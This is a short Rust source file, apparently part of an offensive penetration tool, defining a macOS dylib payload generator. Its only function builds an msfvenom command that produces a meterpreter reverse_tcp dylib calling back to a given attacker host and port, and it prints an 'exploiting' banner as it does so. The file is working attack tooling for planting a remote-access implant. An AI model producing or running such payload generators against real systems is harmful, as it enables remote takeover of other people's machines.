// macOS dylib payload generator
use crate::cli::banner;

pub struct DylibGenerator;

impl DylibGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("MACOS-DYLIB", &format!("{}:{}", lhost, lport));
        
        format!(
            "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f dylib -o payload.dylib",
            lhost, lport
        )
    }
}
